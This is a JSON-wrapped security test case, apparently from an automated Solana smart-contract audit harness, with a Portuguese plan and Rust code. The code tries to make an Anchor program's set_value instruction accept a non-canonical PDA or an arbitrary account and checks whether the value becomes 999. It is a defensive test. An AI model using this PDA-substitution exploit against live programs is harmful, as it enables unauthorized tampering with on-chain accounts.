{
  "plan": "O cenário monta uma conta DataAccount existente com dono do programa e um usuário signer. O baseline chama set_value com o PDA canônico derivado de [b"data", user] e valor 1, provando que o cenário está correto. O ataque tenta usar uma conta com endereço diferente do PDA canônico (por exemplo, um PDA com bump não canônico ou uma conta arbitrária) para verificar se a validação de PDA é contornada. O efeito mede se a conta usada no ataque foi aceita e teve seu campo value alterado, indicando falha na canonicalização do PDA.",
  "scenario": "let user = Pubkey::new_unique();
let (canonical_pda, _bump) = Pubkey::find_program_address(&[b"data", user.as_ref()], &env.program_id);

// Conta DataAccount existente no PDA canônico
let data_account_data = anchor_account_data("DataAccount", &[user, 0u64, 0u8]);
let data_account = account(&env.program_id, &data_account_data, None);

let user_account = wallet(1_000_000_000);

// Baseline: uso legítimo com o PDA canônico
let ix_baseline = env.anchor_ix(
    "set_value",
    &(1u64,),
    vec![
        AccountMeta::new(canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let contas_baseline = vec![
    (canonical_pda, data_account.clone()),
    (user, user_account.clone()),
];
let r_baseline = env.baseline("set_value com PDA canônico", &ix_baseline, &contas_baseline);

// Ataque: usar uma conta com endereço diferente do PDA canônico
// Tentamos um bump não canônico para o mesmo par (data, user)
let mut non_canonical_pda = Pubkey::default();
let mut found = false;
for bump in (0u8..=255).rev() {
    if let Ok(pda) = Pubkey::create_program_address(&[b"data", user.as_ref(), &[bump]], &env.program_id) {
        if pda != canonical_pda {
            non_canonical_pda = pda;
            found = true;
            break;
        }
    }
}

if !found {
    // Se não houver bump alternativo, usamos uma conta arbitrária
    non_canonical_pda = Pubkey::new_unique();
}

let fake_data = anchor_account_data("DataAccount", &[user, 0u64, 0u8]);
let fake_account = account(&env.program_id, &fake_data, None);

let ix_attack = env.anchor_ix(
    "set_value",
    &(999u64,),
    vec![
        AccountMeta::new(non_canonical_pda, false),
        AccountMeta::new_readonly(user, true),
    ],
);
let contas_attack = vec![
    (non_canonical_pda, fake_account),
    (user, user_account),
];
let r_attack = env.attack("set_value com PDA não canônico", &ix_attack, &contas_attack);

if r_attack.program_result == ProgramResult::Success {
    let data_after = after(&r_attack, &non_canonical_pda).data();
    let value_after = read_u64(data_after, 40);
    env.effect(
        "PDA não canônico aceito e valor alterado para 999",
        value_after == 999u64,
    );
}"
}

